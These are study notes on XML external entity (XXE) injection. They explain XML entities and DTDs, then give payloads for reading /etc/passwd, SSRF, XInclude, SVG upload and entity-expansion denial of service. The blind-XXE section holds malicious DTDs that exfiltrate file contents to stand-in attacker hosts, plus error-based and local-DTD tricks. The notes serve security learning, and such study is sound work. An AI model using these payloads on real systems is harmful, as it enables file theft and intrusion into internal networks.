>[!info]
>- Allows an attacker to interfere with an application's processing of XML data.
>- It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
----
# XML Entities

>[!question] What is XML?
>- `XML` stands for "extensible markup language".
>- `XML` is a language designed for storing and transporting data.
>- `XML` uses a tree-like structure of tags and data.
>- Unlike `HTML`, `XML` does not use predefined tags. 

>[!question] What are XML entities?
>- `XML` entities are a way of representing an item of data within an `XML` document, instead of using the data itself.
>- Various entities are built in to the specification of the `XML` language.

>[!question] What is document type definition?
>- The `document type definition (DTD)` contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items.
>- The `DTD` is declared within the optional `DOCTYPE` element at the start of the `XML` document.
>- The `DTD` can be fully self-contained within the document itself (`Internal DTD`) or can be loaded from elsewhere (`External DTD`) or can be hybrid of the two.
----
>[!info] Main XML Entities
>
>>[!example] Predefined Entities  
>>These are built-in entities in `XML` that represent special characters:
>>- `&lt;` --> Represents the `<` character.
>>- `&gt;` --> Represents the `>` character.
>>- `&amp;` --> Represents the `&` character.
>>- `&apos;` --> Represents the `'` character.
>>- `&quot;` --> Represents the `"` character.
>
>>[!example] Custom Entities
>>These are user-defined entities declared in the `Document Type Definition (DTD)`:
>>```xml
>><!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
>>```
>>This definition means that any usage of the entity reference `&myentity;` within the `XML` document will be replaced with the defined value: "`my entity value`".
>
>>[!example] External Entities
>>`XML` external entities are a type of custom entity whose definition is located outside of the `DTD` where they are declared.
>>The declaration of an external entity uses the `SYSTEM` keyword and must specify a `URL` or file from which the value of the entity should be loaded:
>>```xml
>><!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
>>```
>>```xml
>><!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
>>```
>
>>[!example] Parameter Entities
>>These are used exclusively within `DTDs` and are prefixed with a `%`:
>>```xml
>><!ENTITY % paramEntity "This is a parameter entity">
>>```
>
>>[!example] General Entities
>>These are the most common type of entities and are referenced in the `XML` document body:
>>```xml
>><!ENTITY generalEntity "This is a general entity">
>>```
>
>>[!example] Internal Entities
>>These entities are defined within the `DTD` and do not reference external resources:
>>```xml
>><!ENTITY internalEntity "This is an internal entity">
>>```
----
# XXE

>[!warning] How do XXE vulnerabilities arise?
>- Some applications use the `XML` format to transmit data between the browser and the server.
>- Applications that do this virtually always use a standard library or platform `API` to process the `XML` data on the server.
>- `XXE` vulnerabilities arise because the `XML` specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

>[!bug] XXE-Specific Entities
>
>>[!danger] File Retrieval
>>To perform an `XXE injection` that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted `XML` in two ways:
>>- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
>>- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
>>```xml
>><?xml version="1.0" encoding="UTF-8"?>
>><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
>><stockCheck><productId>&xxe;</productId></stockCheck>
>>```
>>
>>>[!tip]
>>>- With real-world `XXE` vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response.
>>>- To test systematically for `XXE` vulnerabilities, you will generally need to test each data node in the `XML` individually, by making use of your defined entity and seeing whether it appears within the response.
>
>>[!danger] Server-Side Request Forgery
>>Server-side application can be induced to make `HTTP` requests to any `URL` that the server can access.
>>- Define an external `XML` entity using the `URL` that you want to target, and use the defined entity within a data value.
>>- If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the `URL` within the application's response, and so gain two-way interaction with the back-end system.
>>- If not, then you will only be able to perform blind `SSRF` attacks.
>>```xml
>><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
>>```
>
>>[!danger] XInclude attacks
>>`XInclude` is a part of the XML specification that allows an `XML` document to be built from sub-documents.
>>- You can place an `XInclude` attack within any data value in an `XML` document.
>>- The attack can be performed in situations where you only control a single item of data that is placed into a server-side `XML` document.
>>- To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include.
>>```xml
>><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
>>```
>>```
>>%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20parse%3D%22text%22%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Ffoo%3E
>>```
>
>>[!danger] File upload
>>Some common file formats use `XML` or contain `XML` subcomponents.
>>- Examples of `XML-based` formats are office document formats like `DOCX` and image formats like `SVG`.
>>```xml
>><?xml version="1.0" standalone="no"?>
>><!DOCTYPE svg [
>>  <!ENTITY xxe SYSTEM "file:///etc/hostname" >
>>]>
>><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
>>  <text font-size="16" x="0" y="16">&xxe;</text>
>></svg>
>>```
>
>>[!danger] Denial of Service
>>Exploiting entities to cause resource exhaustion:
>>```xml
>><!ENTITY lol "lol">
>><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
>><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
>>```

>[!important]
>Most `POST` requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including `XML`.
>- For example, if a normal request contains the following:
>```
>POST /action HTTP/1.0
>Content-Type: application/x-www-form-urlencoded
>Content-Length: 7
>foo=bar
>```
>- Then you might be able submit the following request, with the same result:
>```
>POST /action HTTP/1.0
>Content-Type: text/xml
>Content-Length: 52
><?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
>```
----
## Blind XXE

>[!question] What is Blind XXE?
>- Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. 

>[!danger] Detecting blind XXE using out-of-band (OAST) techniques
>- Define an external entity as follows:
>```xml
><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
>```
>- You would then make use of the defined entity in a data value within the `XML`.
>- This `XXE` attack causes the server to make a back-end `HTTP` request to the specified `URL`.
>- The attacker can monitor for the resulting `DNS` lookup and `HTTP` request, and thereby detect that the `XXE` attack was successful.

>[!danger] Blind XXE using out-of-band detection via XML parameter entities
>- Sometimes, `XXE` attacks using regular entities are blocked, due to some input validation by the application or some hardening of the `XML` parser that is being used.
>- In this situation, you might be able to use `XML` parameter entities instead.
>- `XML` parameter entities are a special kind of `XML` entity which can only be referenced elsewhere within the `DTD`:
>```xml
><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
>```
>- This `XXE` payload declares an `XML` parameter entity called `xxe` and then uses the entity within the `DTD`.
>- This will cause a `DNS` lookup and `HTTP` request to the attacker's domain, verifying that the attack was successful.

>[!danger] Out-of-Band Data Exfiltration
>This can be achieved via a blind `XXE` vulnerability, but it involves the attacker hosting a malicious `DTD` on a system that they control, and then invoking the external `DTD` from within the in-band `XXE` payload.
>
>>[!example]
>>An example of a malicious `DTD` to exfiltrate the contents of the `/etc/passwd` file is as follows:
>>```xml
>><!ENTITY % file SYSTEM "file:///etc/passwd">
>><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
>>%eval;
>>%exfiltrate;
>>```
>>- Defines an `XML` parameter entity called `file`, containing the contents of the `/etc/passwd` file.
>>- Defines an `XML` parameter entity called `eval`, containing a dynamic declaration of another `XML` parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an `HTTP` request to the attacker's web server containing the value of the `file` entity within the `URL` query string.
>>- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
>>- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified `URL`.
>>- The attacker must then host the malicious `DTD` on a system that they control, normally by loading it onto their own webserver:
>>```
>>http://web-attacker.com/malicious.dtd
>>```
>>- Finally, the attacker must submit the following XXE payload to the vulnerable application:
>>```xml
>><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
>>```
>>- This `XXE` payload declares an `XML` parameter entity called `xxe` and then uses the entity within the `DTD`.
>>- This will cause the `XML` parser to fetch the external `DTD` from the attacker's server and interpret it inline.
>>- The steps defined within the malicious `DTD` are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.
>
>>[!example] Example 2
>>```xml
>><!ENTITY % payload SYSTEM "file:///etc/passwd">
>><!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server/?data=%payload;'>">
>>```
>>- The first line defines an entity named `payload` that points to the file `/etc/passwd` on the server.
>>- The second line defines another entity (`oob`) that sends the content of the `payload` to the attacker's server.
>>- The attacker can trigger the `oob` entity later, causing the data to be exfiltrated.
>
>>[!important]
>>- This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file.
>>- This is because some `XML` parsers fetch the `URL` in the external entity definition using an `API` that validates the characters that are allowed to appear within the `URL`.
>>- In this situation, it might be possible to use the `FTP` protocol instead of `HTTP`.
>>- Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.

>[!danger] Exploiting blind XXE to retrieve data via error messages
>- An alternative approach to exploiting blind `XXE` is to trigger an `XML` parsing error where the error message contains the sensitive data that you wish to retrieve.
>- This will be effective if the application returns the resulting error message within its response.
>
>>[!example]
>>- You can trigger an `XML` parsing error message containing the contents of the `/etc/passwd` file using a malicious external `DTD` as follows:
>>```xml
>><!ENTITY % file SYSTEM "file:///etc/passwd"> 
>><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
>>%eval;
>>%error;
>>```
>>- Defines an `XML` parameter entity called `file`, containing the contents of the `/etc/passwd` file.
>>- Defines an `XML` parameter entity called `eval`, containing a dynamic declaration of another `XML` parameter entity called `error`.
>>- The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
>>- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
>>- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
>
>>[!warning]
>>- The preceding technique works fine with an external `DTD`, but it won't normally work with an internal `DTD` that is fully specified within the `DOCTYPE` element.
>>- This is because the technique involves using an `XML` parameter entity within the definition of another parameter entity.
>>- Per the `XML` specification, this is permitted in external `DTD` but not in internal `DTD`. (Some parsers might tolerate it, but many do not.)

>[!danger] Exploiting blind XXE by repurposing a local DTD
>- If a document's `DTD` uses a hybrid of internal and external `DTD` declarations, then the internal `DTD` can redefine entities that are declared in the external `DTD`.
>- When this happens, the restriction on using an `XML` parameter entity within the definition of another parameter entity is relaxed.
>- This means that an attacker can employ the [error-based XXE](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) technique from within an internal `DTD`, provided the `XML` parameter entity that they use is redefining an entity that is declared within an external `DTD`.
>- Of course, if out-of-band connections are blocked, then the external `DTD` cannot be loaded from a remote location.
>- Instead, it needs to be an external `DTD` file that is local to the application server.
>- Essentially, the attack involves invoking a `DTD` file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data.
> 
>>[!example]
>>- Suppose there is a `DTD` file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this `DTD` file defines an entity called `custom_entity`.
>>- An attacker can trigger an `XML` parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:
>>```xml
>><!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
>>```
>>- Defines an `XML` parameter entity called `local_dtd`, containing the contents of the external `DTD` file that exists on the server filesystem.
>>- Redefines the `XML` parameter entity called `custom_entity`, which is already defined in the external `DTD` file.
>>- The entity is redefined as containing the [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) that was already described, for triggering an error message containing the contents of the `/etc/passwd` file.
>>- Uses the `local_dtd` entity, so that the external `DTD` is interpreted, including the redefined value of the `custom_entity` entity.
>>- This results in the desired error message.
>
>>[!tip] Locating an existing DTD file to repurpose
>>- Since this `XXE` attack involves repurposing an existing `DTD` on the server filesystem, a key requirement is to locate a suitable file. 
>>- This is actually quite straightforward because the application returns any error messages thrown by the `XML` parser, you can easily enumerate local `DTD` files just by attempting to load them from within the internal `DTD`.
>>
>>>[!example]
>>>- `Linux` systems using the `GNOME` desktop environment often have a `DTD` file at `/usr/share/yelp/dtd/docbookx.dtd`.
>>>- You can test whether this file is present by submitting the following `XXE` payload, which will cause an error if the file is missing:
>>>```
>>><!DOCTYPE foo [
>>><!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
>>>%local_dtd;
>>>]>
>>>```
>>>- After you have tested a list of common `DTD` files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine.
>>>- Since many common systems that include `DTD` files are open source, you can normally quickly obtain a copy of files through internet search.